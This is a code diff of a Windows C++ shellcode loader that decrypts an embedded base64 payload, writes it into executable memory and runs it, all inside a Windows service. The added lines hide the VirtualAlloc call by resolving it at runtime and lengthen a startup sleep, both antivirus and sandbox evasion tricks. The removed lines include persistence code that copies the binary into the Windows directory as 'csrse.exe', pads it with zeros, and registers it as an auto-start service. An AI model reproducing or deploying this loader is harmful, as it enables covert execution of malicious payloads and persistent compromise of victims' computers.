@@ -1,5 +1,4 @@
 #include <windows.h>  
-#include <stdio.h>  
 #include <string>
 #include "b64/base64.h"
 //#include <string.h>
@@ -25,50 +24,7 @@ typedef void(__stdcall *CODE) ();
 char * shellcode = NULL;
 int shellcode_size = 0; 
 
-BOOL Move_(char* szPath, char *trPath, int bigger) {
-	//if (bigger == 0) {
-		CopyFile(szPath, trPath, TRUE);
-		return TRUE;
-	
-	}
-	else {
-		HANDLE pFile;
-		DWORD fileSize;
-		char *buffer;
-		DWORD dwBytesRead, dwBytesToRead, tmpLen;
-		pFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-		if (pFile == INVALID_HANDLE_VALUE) {
-			CloseHandle(pFile);
-			return FALSE;
-		}
-		fileSize = GetFileSize(pFile, NULL);
-		buffer = (char *)malloc(fileSize);
-		ZeroMemory(buffer, fileSize);
-		dwBytesToRead = fileSize;
-		dwBytesRead = 0;
-		ReadFile(pFile, buffer, dwBytesToRead, &dwBytesRead, NULL);
-		CloseHandle(pFile);
-		HANDLE pFile2;
-		DWORD dwBytesWrite, dwBytesToWrite;
-		pFile2 = CreateFile(trPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-		if (pFile2 == INVALID_HANDLE_VALUE) {
-			CloseHandle(pFile);
-			return FALSE;
-		}
-		dwBytesToWrite = fileSize;
-		dwBytesWrite = 0;
-		WriteFile(pFile2, buffer, dwBytesToWrite, &dwBytesWrite, NULL);
-		char *blank = (char *)malloc(1024);
-		ZeroMemory(blank, 1024);
-		for (int i = 0; i < bigger; i++) {
-			WriteFile(pFile2, blank, 1024, &dwBytesWrite, NULL);
-		}
-		free(blank);
-		CloseHandle(pFile2);
-		free(buffer);
-
-	}
-}
+typedef PVOID (*M) (DWORD, DWORD, DWORD, DWORD);
 
 std::string GenerateUri()
 {
@@ -100,8 +56,11 @@ std::string GetKey()
 }
 void LoadShellCode(char *shellcode)
 {
+	HMODULE hDllLib = LoadLibrary("Kernel32.dll");
+	FARPROC fpFun = GetProcAddress(hDllLib, "VirtualAlloc");
+	M VirtualAlloc_ = (M)*fpFun;
 	PVOID p = NULL;
-	p = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	p = VirtualAlloc_(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	memcpy_s(p, shellcode_size, shellcode, shellcode_size);
 	
 	CODE code = (CODE)p;
@@ -129,9 +88,9 @@ void DecPayload(std::string key)
 	
 }
 
-SECURITY_ATTRIBUTES pipeattr1, pipeattr2;
-HANDLE hReadPipe1, hWritePipe1, hReadPipe2, hWritePipe2;
-SECURITY_ATTRIBUTES saIn, saOut;
+
+
+
 
 SERVICE_STATUS ServiceStatus;
 SERVICE_STATUS_HANDLE ServiceStatusHandle;
@@ -175,78 +134,15 @@ void WINAPI BDHandler(DWORD dwControl)
 	}
 }
 
-void ServiceInstall() {
-	char  szPath[MAX_PATH];
-	char  target[MAX_PATH];
-	//char  tar_path[MAX_PATH];
-	char  Direectory[MAX_PATH];
-	//ShowWindow(GetConsoleWindow(), SW_HIDE);
-	if (OpenEventA(2031619, FALSE, ServiceName.c_str()) != 0) {
-		return;
-	}
-	// AdvanceProcess();
+int main()
+{  
 	SERVICE_TABLE_ENTRY ServiceTable[2];
-	ServiceTable[0].lpServiceName = (LPSTR)ServiceName.c_str();
+	ServiceTable[0].lpServiceName = (char *)ServiceName.c_str();
 	ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
 	ServiceTable[1].lpServiceName = NULL;
 	ServiceTable[1].lpServiceProc = NULL;
 	StartServiceCtrlDispatcher(ServiceTable);
-	if (!GetEnvironmentVariable("WINDIR", (LPSTR)target, MAX_PATH)) return;
-
-	if (!GetModuleFileName(NULL, (LPSTR)szPath, MAX_PATH)) return;
-
-	if (!GetCurrentDirectory(MAX_PATH, Direectory)) return;
-	if (strcmp(Direectory, target) != 0) {
-		//判断是否在windows目录下
-		std::string starget = target;
-		starget.append("\\csrse.exe");
-		Move_(szPath,(char *)starget.c_str(),30000);
-		SC_HANDLE hScm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
-		if (hScm == NULL)
-		{
-			return ;
-		}
-		//创建系统服务，参数很多，可查看帮助文档
-
-		SC_HANDLE hService = CreateService(hScm, ServiceName.c_str(), ServiceName.c_str(), SERVICE_ALL_ACCESS,
-			SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, starget.c_str(),
-			NULL, NULL, "", NULL, "");
-		if (hService == NULL)
-		{
-			return ;
-		}
-		//启动系统服务
-		if (StartService(hService, 0, NULL) == false)
-		{
-			return ;
-		}
-		//释放句柄
-		CloseServiceHandle(hScm);
-		CloseServiceHandle(hService);
-		exit(0);
-		/*
-		std::string cmd = "sc create ";
-		cmd = cmd + ServiceName;
-		cmd.append(" binPath= ");
-		cmd = cmd + starget;
-		system(cmd.c_str());
-		//sprintf(cmd,"attrib +s +a +h +r %s",target);
-		//system(cmd);
-		//sprintf(cmd,"sc start ", ServiceName.c_str());
-		cmd = "sc start ";
-		cmd = cmd + ServiceName;
-		system(cmd.c_str());
-		exit(0);
-		*/
-		return;
-	}
-}
-
-
-int main()
-{  
-	
-	Sleep(2000);
+	Sleep(20000);
 	//如果要不安装服务运行，请直接DecPayload(GetKey());
 	//ServiceInstall();
 	DecPayload(GetKey());
